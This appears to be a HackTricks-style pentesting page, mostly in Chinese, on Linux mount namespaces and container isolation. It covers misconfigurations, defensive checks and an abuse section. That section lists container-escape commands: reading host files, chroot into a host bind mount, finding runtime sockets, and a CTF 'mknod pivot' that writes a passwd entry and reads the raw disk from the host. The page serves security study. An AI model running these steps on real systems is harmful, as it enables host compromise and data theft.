# 挂载命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

挂载命名空间控制进程所看到的 **挂载表**。这是容器隔离中最重要的特性之一，因为根文件系统、bind 挂载、tmpfs 挂载、procfs 视图、sysfs 的暴露以及许多运行时特定的辅助挂载，都是通过该挂载表来表达的。两个进程可能都能访问 `/`、`/proc`、`/sys` 或 `/tmp`，但这些路径最终指向什么取决于它们所处的挂载命名空间。

从容器安全的角度来看，挂载命名空间往往决定了“这是一个为应用精心准备的文件系统”与“该进程可以直接看到或影响主机文件系统”之间的差别。这也是 bind 挂载、`hostPath` 卷、特权挂载操作以及可写的 `/proc` 或 `/sys` 暴露等都围绕此命名空间展开的原因。

## 运行机制

当运行时启动一个容器时，通常会创建一个新的挂载命名空间，为容器准备根文件系统，按需挂载 procfs 和其他辅助文件系统，然后可选地添加 bind 挂载、tmpfs 挂载、secrets、config maps 或 host paths。一旦进程在该命名空间内运行，它所看到的挂载集就与主机的默认视图在很大程度上解耦。主机仍然能看到真实的底层文件系统，但容器看到的是由运行时为其组装的那个版本。

这很强大，因为它让容器认为自己拥有独立的根文件系统，尽管主机仍在管理一切。但这也很危险，如果运行时暴露了错误的挂载，进程就会突然获得对主机资源的可见性，而安全模型的其他部分可能并未针对这些情况进行保护。

## 实验

You can create a private mount namespace with:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
如果你在该 namespace 之外打开另一个 shell 并检查 mount table，你会看到 tmpfs mount 只存在于隔离的 mount namespace 内。  
这是一个有用的练习，因为它表明 mount isolation 并非抽象理论；kernel 实际上向 process 呈现了不同的 mount table。  
如果你在该 namespace 之外打开另一个 shell 并检查 mount table，tmpfs mount 将只存在于隔离的 mount namespace 内。

在 containers 内，快速比较如下：
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
第二个示例演示了运行时配置如何轻易地穿透文件系统的边界。

## 运行时使用

Docker、Podman、基于 containerd 的栈和 CRI-O 都依赖私有挂载命名空间来运行普通容器。Kubernetes 在此机制之上实现了 volumes、projected secrets、config maps 和 `hostPath` 挂载。Incus/LXC 环境也大量依赖挂载命名空间，特别是因为 system containers 通常比 application containers 暴露出更丰富、更接近主机的文件系统。

这意味着当你审查容器文件系统问题时，通常并不是在看一个孤立的 Docker 怪异行为，而是在通过启动该工作负载的平台表现出来的挂载命名空间和运行时配置问题。

## 错误配置

最明显且最危险的错误是通过 bind mount 暴露宿主机根文件系统或其他敏感宿主路径，例如 `-v /:/host` 或 Kubernetes 中可写的 `hostPath`。此时问题不再是“容器能否以某种方式逃逸？”，而是“有多少有用的宿主内容已经可以被直接看到并写入？”。可写的宿主绑定挂载通常会把剩下的利用过程简化为文件放置、chroot、配置修改或运行时 socket 发现。

另一个常见问题是以绕过容器更安全视图的方式暴露宿主机的 `/proc` 或 `/sys`。这些文件系统不是普通的数据挂载点；它们是内核和进程状态的接口。如果工作负载直接访问到宿主机对应的版本，容器加固背后的许多假设将不再成立。

只读保护也很重要。只读根文件系统并不会自动确保容器安全，但它会移除大量攻击者用于准备的空间，使持久化、放置辅助二进制文件和篡改配置变得更困难。相反，可写根或可写的宿主绑定挂载会为攻击者准备下一步提供空间。

## 滥用

当挂载命名空间被滥用时，攻击者通常会做四件事中的一件。他们 **读取原本应在容器外部的宿主数据**；通过可写绑定挂载 **修改宿主配置**；在 capabilities 和 seccomp 允许时 **挂载或重新挂载额外资源**；或者 **访问强权限的 socket 和运行时状态目录**，从而向容器平台本身请求更多权限。

如果容器已经能看到宿主文件系统，其余的安全模型会立即发生变化。

当你怀疑存在宿主绑定挂载时，首先确认可用的内容以及是否可写：
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
如果宿主机的根文件系统以读写方式挂载，直接访问宿主机通常就像下面这样：
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
如果目标是获得特权运行时访问而不是直接 chrooting，枚举 sockets 和运行时状态：
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
如果存在 `CAP_SYS_ADMIN`，还要测试是否可以从容器内部创建新的挂载点：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 完整示例：Two-Shell `mknod` Pivot

当容器的 root 用户可以创建块设备，且主机与容器在用户身份方面有可利用的共享，并且攻击者已经在主机上拥有低权限 foothold 时，会出现一种更专门的滥用路径。在这种情况下，容器可以创建诸如 `/dev/sda` 之类的设备节点，而低权限的主机用户随后可以通过匹配容器进程的 `/proc/<pid>/root/` 来读取它。

在容器内：
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
在主机上，以匹配的低权限用户身份，在定位到容器 shell 的 PID 之后：
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
重要的教训不是精确的 CTF 字符串搜索。它在于通过 `/proc/<pid>/root/` 的 mount-namespace 暴露可以让主机用户重用容器创建的设备节点，即便 cgroup device policy 阻止了在容器内部直接使用。

## 检查

这些命令用于显示当前进程实际所处的文件系统视图。目标是发现源自主机的挂载点、可写的敏感路径，以及任何看起来比普通应用容器根文件系统更广泛的内容。
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
这里值得关注的是：

- Bind mounts from the host，尤其是 `/`, `/proc`, `/sys`、运行时状态目录，或 socket 位置，应当立即显眼。
- 意外的 read-write mounts 通常比大量的 read-only helper mounts 更重要。
- `mountinfo` 通常是查看某个路径是否真的是 host-derived 或 overlay-backed 的最佳位置。

这些检查可以确定 **which resources are visible in this namespace**、**which ones are host-derived** 以及 **which of them are writable or security-sensitive**。
{{#include ../../../../../banners/hacktricks-training.md}}
